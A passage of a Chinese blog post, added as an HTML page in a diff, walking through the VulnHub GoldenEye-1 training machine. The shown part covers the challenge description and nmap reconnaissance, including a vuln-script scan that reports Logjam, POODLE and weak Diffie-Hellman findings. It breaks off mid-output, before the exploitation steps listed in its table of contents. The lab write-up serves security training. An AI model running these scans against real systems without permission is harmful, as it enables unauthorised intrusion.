@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="发布日期名称：GoldenEye：1发布日期：2018年5月4日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;open?id&#x3D;1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;goldeneye&#x2F;GoldenEye-v1.ova Download (To">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[GoldenEye-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/08/GoldenEye-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="发布日期名称：GoldenEye：1发布日期：2018年5月4日 下载 Download: https:&#x2F;&#x2F;drive.google.com&#x2F;open?id&#x3D;1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;goldeneye&#x2F;GoldenEye-v1.ova Download (To">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub133.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub134.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub135.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub136.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub137.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub138.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub139.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub140.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/007.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub141.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub142.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub143.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub144.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub145.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub146.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub147.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub148.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-08T08:24:57.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:45:47.105Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/08/GoldenEye-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/08/GoldenEye-1/","path":"2020/01/08/GoldenEye-1/","title":"vulnhub靶机渗透[GoldenEye-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[GoldenEye-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E5%B8%83%E6%97%A5%E6%9C%9F"><span class="nav-number">1.</span> <span class="nav-text">发布日期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/08/GoldenEye-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[GoldenEye-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[GoldenEye-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-08 16:24:57" itemprop="dateCreated datePublished" datetime="2020-01-08T16:24:57+08:00">2020-01-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:45:47" itemprop="dateModified" datetime="2020-08-17T00:45:47+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：GoldenEye：1<br>发布日期：2018年5月4日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU03bU1kU01ISHBpRktXM0pMcXE4Ym9Ockk5NU52NHRx">https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YQ==">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YS50b3JyZW50">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：中级</p>
+<p>最近完成了创建OSCP型易受攻击的计算机的工作，该计算机的主题是伟大的James Bond电影（甚至更好的n64游戏）GoldenEye。目标是root并捕获秘密的GoldenEye代码-flag.txt。我认为它是中级的，它具有root所需的多种技术-没有漏洞利用开发&#x2F;缓冲区溢出。在完成OSCP之后，我认为这将是一个不错的实践，另外还有一点CTF风味。我已经在VMware和VirtualBox上创建并验证。除了默认情况下，您不需要其他工具。将需要设置为“host only”，并且在VMware上，由于格式化，在最初启动它时，如果出现提示，可能需要单击“重试”。</p>
+<p>Beta-2018-05-02 v1-2018-05-04</p>
+<p>GoldenEye是由creosote发起并在Vulnhub举办的一项以秘密服务为主题的挑战。GoldenEye是一个CTF样式的框，而不是现实的渗透测试方案。此框需要相当多的“即开即用”的思想，才能找到根源。</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -n -Pn -v -sV 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br></pre></td></tr></table></figure>
+<p>除了在端口80上运行的Web应用程序之外，还有两个pop3端口和一个smtp端口。建议使用主应用程序导航到&#x2F;sev-home&#x2F;。但是，该应用程序在浏览到&#x2F;sev-home&#x2F;时提示输入用户名和密码，而我对凭证还一无所知。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 25,80,55006,55007 -A -v -Pn -n -sV -T5 --script=vuln --min-rate=10000 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_128_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|   </span><br><span class="line">|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:74733  CVE:CVE-2015-4000</span><br><span class="line">|       The Transport Layer Security (TLS) protocol contains a flaw that is</span><br><span class="line">|       triggered when handling Diffie-Hellman key exchanges defined with</span><br><span class="line">|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker</span><br><span class="line">|       to downgrade the security of a TLS session to 512-bit export-grade</span><br><span class="line">|       cryptography, <span class="built_in">which</span> is significantly weaker, allowing the attacker</span><br><span class="line">|       to more easily <span class="built_in">break</span> the encryption and monitor or tamper with</span><br><span class="line">|       the encrypted stream.</span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2015-5-19</span><br><span class="line">|     Check results:</span><br><span class="line">|       EXPORT-GRADE DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 512</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 512</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000</span><br><span class="line">|       https://weakdh.org</span><br><span class="line">|       https://www.securityfocus.com/bid/74733</span><br><span class="line">|   </span><br><span class="line">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="built_in">groups</span></span><br><span class="line">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="line">|       shared <span class="built_in">groups</span>, may be susceptible to passive eavesdropping attacks.</span><br><span class="line">|     Check results:</span><br><span class="line">|       WEAK DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|_      https://weakdh.org</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used <span class="keyword">in</span> OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, <span class="built_in">which</span> makes it easier</span><br><span class="line">|           <span class="keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the <span class="string">&quot;POODLE&quot;</span> issue.</span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://www.securityfocus.com/bid/70574</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span 